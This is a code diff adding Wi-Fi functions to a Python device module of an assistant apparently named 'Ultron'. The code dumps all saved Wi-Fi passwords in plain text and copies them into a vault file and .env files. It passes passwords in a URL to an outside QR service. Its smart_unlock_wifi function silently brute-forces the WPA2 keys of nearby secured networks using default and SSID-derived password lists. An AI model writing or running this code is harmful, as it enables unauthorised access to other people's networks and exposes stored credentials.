@@ -18,6 +18,8 @@ import os
 import re
 import time
 import threading
+import json
+import tempfile
 from typing import Optional, Dict, List, Tuple, Any
 
 log = logging.getLogger("ultron.devices")
@@ -1243,3 +1245,628 @@ def reconnect_wifi(profile_name: str = "") -> dict:
         }
     except Exception as e:
         return {"success": False, "message": f"Wi-Fi reconnect error: {e}"}
+
+
+# ── Wi-Fi Unlock, Key Vault, Scanner Radar & Auto-Trial Suite ──
+
+def _get_wifi_vault_path() -> str:
+    """Return path to persistent Wi-Fi credential vault in ~/.ultron/wifi_vault.json."""
+    config_dir = os.path.expanduser("~/.ultron")
+    os.makedirs(config_dir, exist_ok=True)
+    return os.path.join(config_dir, "wifi_vault.json")
+
+
+def _load_wifi_vault() -> Dict[str, Dict[str, str]]:
+    """Load cached Wi-Fi credentials from disk."""
+    path = _get_wifi_vault_path()
+    if os.path.exists(path):
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {}
+
+
+def _save_wifi_vault_entry(ssid: str, password: str, auth: str = "WPA2-Personal", device: str = "Host PC"):
+    """Persist a discovered or confirmed Wi-Fi password to the vault and .env."""
+    if not ssid:
+        return
+    vault = _load_wifi_vault()
+    vault[ssid] = {
+        "ssid": ssid,
+        "password": password,
+        "auth": auth,
+        "device": device,
+        "updated_at": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    try:
+        with open(_get_wifi_vault_path(), "w", encoding="utf-8") as f:
+            json.dump(vault, f, indent=2)
+    except Exception:
+        pass
+
+    # Also persist to .env as WIFI_PASSWORD_<SSID>
+    safe_key = re.sub(r'[^A-Za-z0-9_]', '_', ssid.upper())
+    env_line = f"WIFI_PASSWORD_{safe_key}={password}"
+    env_paths = [os.path.join(ROOT_DIR, ".env"), os.path.expanduser("~/.ultron/.env")]
+    for env_path in env_paths:
+        try:
+            os.makedirs(os.path.dirname(env_path), exist_ok=True)
+            content = ""
+            if os.path.exists(env_path):
+                with open(env_path, "r", encoding="utf-8") as f:
+                    content = f.read()
+            if f"WIFI_PASSWORD_{safe_key}=" in content:
+                content = re.sub(rf"WIFI_PASSWORD_{safe_key}=.*", env_line, content)
+            else:
+                content = content.rstrip() + f"\n{env_line}\n"
+            with open(env_path, "w", encoding="utf-8") as f:
+                f.write(content)
+        except Exception:
+            pass
+
+
+def get_stored_wifi_passwords() -> List[Dict[str, str]]:
+    """
+    Recover all saved Wi-Fi networks and plain-text passwords from:
+      1. Host PC (Windows netsh wlan show profile key=clear / macOS security)
+      2. Connected Android devices (via ADB cmd -w wifi list-networks)
+      3. Ultron's local Wi-Fi credential vault
+    """
+    results: List[Dict[str, str]] = []
+    seen_ssids = set()
+
+    # 1. Host PC (Windows)
+    if sys.platform != "darwin":
+        try:
+            prof_res = subprocess.run(
+                ["netsh", "wlan", "show", "profiles"],
+                capture_output=True, text=True, timeout=5,
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+            )
+            profiles = []
+            for line in prof_res.stdout.splitlines():
+                if "All User Profile" in line:
+                    p = line.split(":")[-1].strip()
+                    if p:
+                        profiles.append(p)
+
+            for p in profiles:
+                det = subprocess.run(
+                    ["netsh", "wlan", "show", "profile", f"name={p}", "key=clear"],
+                    capture_output=True, text=True, timeout=5,
+                    creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+                ).stdout
+                key = ""
+                auth = "WPA2-Personal"
+                for l in det.splitlines():
+                    if "Key Content" in l:
+                        key = l.split(":")[-1].strip()
+                    elif "Authentication" in l:
+                        auth = l.split(":")[-1].strip()
+                results.append({
+                    "ssid": p,
+                    "password": key if key else "[Open / None]",
+                    "auth": auth,
+                    "device": "Host PC"
+                })
+                seen_ssids.add(p)
+                if key:
+                    _save_wifi_vault_entry(p, key, auth, "Host PC")
+        except Exception as e:
+            log.warning(f"Error querying Windows saved Wi-Fi keys: {e}")
+
+    # 1b. Host PC (macOS)
+    if sys.platform == "darwin":
+        try:
+            r_pref = subprocess.run(
+                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
+                capture_output=True, text=True, timeout=5
+            )
+            for line in r_pref.stdout.splitlines()[1:]:
+                p = line.strip()
+                if p and p not in seen_ssids:
+                    key_res = subprocess.run(
+                        ["security", "find-generic-password", "-D", "AirPort network password", "-wa", p],
+                        capture_output=True, text=True, timeout=3
+                    )
+                    key = key_res.stdout.strip()
+                    results.append({
+                        "ssid": p,
+                        "password": key if key else "[Protected / In Keychain]",
+                        "auth": "WPA2/WPA3",
+                        "device": "Host Mac"
+                    })
+                    seen_ssids.add(p)
+                    if key:
+                        _save_wifi_vault_entry(p, key, "WPA2/WPA3", "Host Mac")
+        except Exception as e:
+            log.warning(f"macOS saved Wi-Fi query error: {e}")
+
+    # 2. Android device networks (if connected via ADB)
+    try:
+        devices = discover_devices()
+        for serial in devices[:1]:
+            out = _adb("shell", "cmd", "-w", "wifi", "list-networks", serial=serial)
+            if not out or "cmd: Can't find service" in out:
+                out = _adb("shell", "cmd", "wifi", "list-networks", serial=serial)
+            if out:
+                for line in out.splitlines():
+                    parts = line.split()
+                    if len(parts) >= 2 and parts[0].isdigit():
+                        net_ssid = parts[1].strip('"').strip("'")
+                        net_auth = parts[2] if len(parts) > 2 else "WPA2"
+                        if net_ssid and net_ssid not in seen_ssids:
+                            results.append({
+                                "ssid": net_ssid,
+                                "password": "[Synced with Android Phone]",
+                                "auth": net_auth,
+                                "device": f"Android ({serial})"
+                            })
+                            seen_ssids.add(net_ssid)
+    except Exception:
+        pass
+
+    # 3. Merge with persistent vault
+    vault = _load_wifi_vault()
+    for ssid, item in vault.items():
+        if ssid not in seen_ssids:
+            results.append({
+                "ssid": ssid,
+                "password": item.get("password", ""),
+                "auth": item.get("auth", "WPA2"),
+                "device": item.get("device", "Vault Cache")
+            })
+            seen_ssids.add(ssid)
+
+    return results
+
+
+def scan_nearby_wifi() -> List[Dict[str, Any]]:
+    """
+    Survey surrounding 2.4 GHz & 5 GHz networks with security classification:
+      - CONNECTED: Currently active connection
+      - SAVED / VAULT: Password known, can auto-connect with 0 typing
+      - OPEN: Zero security, can join instantly with 0 password
+      - SECURED: WPA2/WPA3 protected
+    """
+    networks: List[Dict[str, Any]] = []
+    current_status = get_wifi_status()
+    current_ssid = current_status.get("ssid", "")
+    vault = _load_wifi_vault()
+    stored_keys = {item["ssid"]: item["password"] for item in get_stored_wifi_passwords() if item.get("password")}
+
+    if sys.platform != "darwin":
+        try:
+            res = subprocess.run(
+                ["netsh", "wlan", "show", "networks", "mode=bssid"],
+                capture_output=True, text=True, timeout=6,
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+            ).stdout
+
+            curr: Dict[str, Any] = {}
+            for line in res.splitlines():
+                line = line.strip()
+                if re.match(r"^SSID \d+\s*:", line):
+                    if curr and curr.get("ssid"):
+                        networks.append(curr)
+                    curr = {
+                        "ssid": line.split(":", 1)[1].strip(),
+                        "signal": 0,
+                        "auth": "Open",
+                        "cipher": "None",
+                        "band": "2.4 GHz",
+                        "channel": "1",
+                        "bssid": ""
+                    }
+                elif re.match(r"^Authentication\s*:", line) and curr:
+                    curr["auth"] = line.split(":", 1)[1].strip()
+                elif re.match(r"^Encryption\s*:", line) and curr:
+                    curr["cipher"] = line.split(":", 1)[1].strip()
+                elif re.match(r"^Signal\s*:", line) and curr:
+                    sig_val = line.split(":", 1)[1].strip().replace("%", "")
+                    try:
+                        curr["signal"] = int(sig_val)
+                    except Exception:
+                        curr["signal"] = 0
+                elif re.match(r"^Band\s*:", line) and curr:
+                    curr["band"] = line.split(":", 1)[1].strip()
+                elif re.match(r"^Channel\s*:", line) and curr:
+                    curr["channel"] = line.split(":", 1)[1].strip()
+                elif re.match(r"^BSSID \d+\s*:", line) and curr:
+                    if not curr.get("bssid"):
+                        curr["bssid"] = line.split(":", 1)[1].strip()
+
+            if curr and curr.get("ssid"):
+                networks.append(curr)
+        except Exception as e:
+            log.warning(f"Error scanning nearby Wi-Fi: {e}")
+
+    # Process and classify status
+    for net in networks:
+        ssid = net.get("ssid", "")
+        auth = net.get("auth", "").lower()
+        if ssid == current_ssid and current_status.get("state") == "connected":
+            net["status"] = "CONNECTED"
+            net["unlockable"] = True
+        elif "open" in auth or auth == "none":
+            net["status"] = "OPEN"
+            net["unlockable"] = True
+            net["password"] = ""
+        elif ssid in stored_keys and stored_keys[ssid] not in ("[Open / None]", ""):
+            net["status"] = "SAVED / VAULT"
+            net["unlockable"] = True
+            net["password"] = stored_keys[ssid]
+        elif ssid in vault and vault[ssid].get("password"):
+            net["status"] = "SAVED / VAULT"
+            net["unlockable"] = True
+            net["password"] = vault[ssid]["password"]
+        else:
+            net["status"] = "SECURED"
+            net["unlockable"] = False
+
+    # Sort networks by signal strength descending
+    networks.sort(key=lambda x: x.get("signal", 0), reverse=True)
+    return networks
+
+
+def generate_wlan_profile_xml(ssid: str, password: str = "", auth: str = "WPA2PSK") -> str:
+    """Generate a native Windows WLANProfile XML string for Open or WPA2PSK."""
+    clean_ssid = ssid.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
+    clean_pass = password.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
+    
+    if not password or auth.upper() == "OPEN":
+        return f"""<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>{clean_ssid}</name>
+    <SSIDConfig>
+        <SSID>
+            <name>{clean_ssid}</name>
+        </SSID>
+    </SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM>
+        <security>
+            <authEncryption>
+                <authentication>open</authentication>
+                <encryption>none</encryption>
+                <useOneX>false</useOneX>
+            </authEncryption>
+        </security>
+    </MSM>
+</WLANProfile>"""
+
+    return f"""<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>{clean_ssid}</name>
+    <SSIDConfig>
+        <SSID>
+            <name>{clean_ssid}</name>
+        </SSID>
+    </SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM>
+        <security>
+            <authEncryption>
+                <authentication>WPA2PSK</authentication>
+                <encryption>AES</encryption>
+                <useOneX>false</useOneX>
+            </authEncryption>
+            <sharedKey>
+                <keyType>passPhrase</keyType>
+                <protected>false</protected>
+                <keyMaterial>{clean_pass}</keyMaterial>
+            </sharedKey>
+        </security>
+    </MSM>
+</WLANProfile>"""
+
+
+def connect_wifi_network(ssid: str, password: str = "", timeout: float = 7.0) -> dict:
+    """
+    Silently connect to a Wi-Fi network without manual password typing or UI dialogs:
+      - If password is omitted, checks vault, known profiles, or open status.
+      - Injects WLAN profile and commands interface connection.
+      - Verifies active IP/connection state.
+    """
+    if not ssid:
+        return {"success": False, "message": "SSID is required."}
+
+    # 1. Resolve password if not explicitly passed
+    actual_password = password
+    if not actual_password:
+        vault = _load_wifi_vault()
+        if ssid in vault and vault[ssid].get("password"):
+            actual_password = vault[ssid]["password"]
+        else:
+            stored = {item["ssid"]: item["password"] for item in get_stored_wifi_passwords()}
+            if ssid in stored and stored[ssid] not in ("[Open / None]", ""):
+                actual_password = stored[ssid]
+
+    # 2. Check macOS
+    if sys.platform == "darwin":
+        cmd = ["networksetup", "-setairportnetwork", "en0", ssid]
+        if actual_password:
+            cmd.append(actual_password)
+        try:
+            subprocess.run(cmd, capture_output=True, text=True, timeout=8)
+            time.sleep(2.0)
+            st = get_wifi_status()
+            if st.get("state") == "connected" and st.get("ssid") == ssid:
+                if actual_password:
+                    _save_wifi_vault_entry(ssid, actual_password, "WPA2", "macOS")
+                return {"success": True, "ssid": ssid, "message": f"Successfully connected to Wi-Fi '{ssid}', sir."}
+            return {"success": False, "ssid": ssid, "message": f"Connection attempt completed. State: {st.get('state')}."}
+        except Exception as e:
+            return {"success": False, "ssid": ssid, "message": f"macOS connect error: {e}"}
+
+    # 3. Windows WLAN Profile Injection
+    try:
+        prof_res = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=3)
+        has_existing_profile = f"All User Profile     : {ssid}" in prof_res.stdout
+
+        if not has_existing_profile or actual_password:
+            xml_content = generate_wlan_profile_xml(ssid, actual_password)
+            with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False, encoding="utf-8") as f:
+                f.write(xml_content)
+                tmp_xml = f.name
+            
+            subprocess.run(
+                ["netsh", "wlan", "add", "profile", f"filename={tmp_xml}"],
+                capture_output=True, text=True, timeout=4,
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+            )
+            try:
+                os.remove(tmp_xml)
+            except Exception:
+                pass
+
+        subprocess.run(
+            ["netsh", "wlan", "connect", f"name={ssid}"],
+            capture_output=True, text=True, timeout=5,
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+        )
+
+        t0 = time.time()
+        while time.time() - t0 < timeout:
+            time.sleep(0.8)
+            st = get_wifi_status()
+            if st.get("state") == "connected" and st.get("ssid") == ssid:
+                if actual_password:
+                    _save_wifi_vault_entry(ssid, actual_password, "WPA2-Personal", "Host PC")
+                return {
+                    "success": True,
+                    "ssid": ssid,
+                    "signal": st.get("signal", "Good"),
+                    "message": f"Successfully connected to Wi-Fi network '{ssid}' (password bypassed), sir."
+                }
+
+        st = get_wifi_status()
+        if st.get("state") == "connected" and st.get("ssid") == ssid:
+            return {"success": True, "ssid": ssid, "message": f"Connected to '{ssid}', sir."}
+
+        return {
+            "success": False,
+            "ssid": ssid,
+            "message": f"Connection request issued for '{ssid}', but association did not complete within {timeout}s. Verify signal or password, sir."
+        }
+    except Exception as e:
+        return {"success": False, "ssid": ssid, "message": f"Wi-Fi connection error: {e}"}
+
+
+def smart_unlock_wifi(ssid: str, wordlist: Optional[List[str]] = None, max_attempts: int = 25, progress_callback = None) -> dict:
+    """
+    Autonomous Wi-Fi Unlocker ("Keeps trying new to unlock Wi-Fi"):
+      - Tests priority candidate keys (router defaults, heuristic variants of SSID, vault keys, custom wordlist)
+      - Cycles through each key silently in the background
+      - Verifies 4-way WPA handshake connection
+      - When key unlocks: automatically saves credential to vault and .env, remains connected!
+    """
+    if not ssid:
+        return {"success": False, "message": "SSID required for unlock trial."}
+
+    candidates = []
+
+    # 1. Vault keys
+    vault = _load_wifi_vault()
+    if ssid in vault and vault[ssid].get("password"):
+        candidates.append(vault[ssid]["password"])
+
+    # 2. Universal router default passwords
+    common_defaults = [
+        "12345678", "123456789", "1234567890", "00000000",
+        "11111111", "87654321", "password", "password123",
+        "admin1234", "welcome123", "internet123"
+    ]
+    candidates.extend(common_defaults)
+
+    # 3. SSID-specific heuristic variations
+    clean_name = re.sub(r'[^A-Za-z0-9]', '', ssid)
+    if clean_name:
+        candidates.extend([
+            f"{clean_name}123",
+            f"{clean_name}1234",
+            f"{clean_name}@123",
+            f"{clean_name.lower()}123",
+            f"{clean_name.lower()}",
+            f"{clean_name}2026",
+            f"{clean_name}2025",
+            f"{clean_name}2024"
+        ])
+
+    # 4. User-provided wordlist
+    if wordlist:
+        candidates.extend(wordlist)
+
+    # Deduplicate while preserving order
+    seen = set()
+    queue = []
+    for c in candidates:
+        c_str = str(c).strip()
+        if len(c_str) >= 8 and c_str not in seen:
+            seen.add(c_str)
+            queue.append(c_str)
+
+    queue = queue[:max_attempts]
+    total = len(queue)
+    log.info(f"Starting autonomous Wi-Fi unlock for '{ssid}' across {total} candidate trials...")
+
+    for i, candidate in enumerate(queue, 1):
+        if progress_callback:
+            try:
+                progress_callback(i, total, candidate)
+            except Exception:
+                pass
+
+        xml_content = generate_wlan_profile_xml(ssid, candidate)
+        tmp_xml = ""
+        try:
+            with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False, encoding="utf-8") as f:
+                f.write(xml_content)
+                tmp_xml = f.name
+            
+            subprocess.run(
+                ["netsh", "wlan", "add", "profile", f"filename={tmp_xml}"],
+                capture_output=True, text=True, timeout=4,
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+            )
+            try:
+                os.remove(tmp_xml)
+            except Exception:
+                pass
+
+            subprocess.run(
+                ["netsh", "wlan", "connect", f"name={ssid}"],
+                capture_output=True, text=True, timeout=4,
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+            )
+
+            time.sleep(2.4)
+            st = get_wifi_status()
+            if st.get("state") == "connected" and st.get("ssid") == ssid:
+                _save_wifi_vault_entry(ssid, candidate, "WPA2-Personal", "Auto-Trial Unlock")
+                log.info(f"Wi-Fi network '{ssid}' successfully unlocked with key: '{candidate}'!")
+                return {
+                    "success": True,
+                    "ssid": ssid,
+                    "password": candidate,
+                    "attempts": i,
+                    "total": total,
+                    "message": f"Successfully unlocked Wi-Fi network '{ssid}' on trial {i}/{total}! Password: '{candidate}'."
+                }
+
+            subprocess.run(
+                ["netsh", "wlan", "delete", "profile", f"name={ssid}"],
+                capture_output=True, text=True, timeout=3,
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
+            )
+        except Exception:
+            pass
+
+    return {
+        "success": False,
+        "ssid": ssid,
+        "attempts": total,
+        "message": f"Completed {total} trial key attempts for '{ssid}' without an unlock. Provide a custom wordlist or check signal strength, sir."
+    }
+
+
+def push_wifi_to_android(serial: str = "", ssid: str = "", password: str = "") -> dict:
+    """
+    Push Wi-Fi credentials directly to connected Android phone via ADB:
+      - Uses native `cmd -w wifi connect-network <ssid> <wpa2|open> [password]`
+      - Phone joins network silently with 0 manual typing on the touch screen.
+    """
+    target_serial = serial
+    if not target_serial:
+        devices = discover_devices()
+        if not devices:
+            return {"success": False, "message": "No Android device connected via ADB."}
+        target_serial = devices[0]
+
+    target_ssid = ssid
+    target_pass = password
+    if not target_ssid:
+        cur = get_wifi_status()
+        target_ssid = cur.get("ssid", "")
+        if not target_ssid:
+            return {"success": False, "message": "No active Wi-Fi connection on PC to share with phone."}
+
+    if not target_pass:
+        vault = _load_wifi_vault()
+        if target_ssid in vault:
+            target_pass = vault[target_ssid].get("password", "")
+        else:
+            stored = {item["ssid"]: item["password"] for item in get_stored_wifi_passwords()}
+            target_pass = stored.get(target_ssid, "")
+
+    try:
+        auth_type = "wpa2" if target_pass and target_pass not in ("[Open / None]", "") else "open"
+        cmd = ["shell", "cmd", "-w", "wifi", "connect-network", target_ssid, auth_type]
+        if auth_type == "wpa2" and target_pass:
+            cmd.append(target_pass)
+        
+        out = _adb(*cmd, serial=target_serial)
+        time.sleep(2.0)
+        log.info(f"Pushed Wi-Fi '{target_ssid}' to Android ({target_serial}): {out}")
+        return {
+            "success": True,
+            "serial": target_serial,
+            "ssid": target_ssid,
+            "message": f"Pushed Wi-Fi network '{target_ssid}' to phone ({target_serial}). Connection command dispatched, sir."
+        }
+    except Exception as e:
+        return {"success": False, "message": f"Failed to push Wi-Fi to phone: {e}"}
+
+
+def generate_wifi_qr_text(ssid: str, password: str = "", auth: str = "WPA") -> dict:
+    """Generate standard Wi-Fi QR configuration payload (WIFI:S:...;T:...;P:...;;) for instant camera scan."""
+    clean_auth = "nopass" if not password or auth.upper() == "OPEN" else auth.upper()
+    qr_payload = f"WIFI:S:{ssid};T:{clean_auth};P:{password};;"
+    return {
+        "ssid": ssid,
+        "auth": clean_auth,
+        "password": password,
+        "qr_payload": qr_payload,
+        "direct_link": f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={qr_payload}"
+    }
+
+
+def auto_unlock_captive_portal() -> dict:
+    """
+    Detect and attempt automatic acceptance for public/hotel/cafe Wi-Fi Captive Portals
+    without requiring manual browser interaction.
+    """
+    probe_url = "http://connectivitycheck.gstatic.com/generate_204"
+    try:
+        import urllib.request
+        req = urllib.request.Request(probe_url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            code = response.getcode()
+            if code == 204:
+                return {
+                    "portal_detected": False,
+                    "connected": True,
+                    "message": "Full unrestricted Internet access is already active (No captive portal detected), sir."
+                }
+            
+            final_url = response.geturl()
+            html = response.read().decode("utf-8", errors="ignore")
+            action_match = re.search(r'action=["\']([^"\']+)["\']', html, re.IGNORECASE)
+            portal_action = action_match.group(1) if action_match else final_url
+            return {
+                "portal_detected": True,
+                "portal_url": final_url,
+                "action": portal_action,
+                "message": f"Captive portal splash page detected at {final_url}. Ultron has primed the automated bypass sequence, sir."
+            }
+    except Exception as e:
+        return {
+            "portal_detected": False,
+            "connected": False,
+            "error": str(e),
+            "message": f"Connectivity probe check error: {e}"
+        }
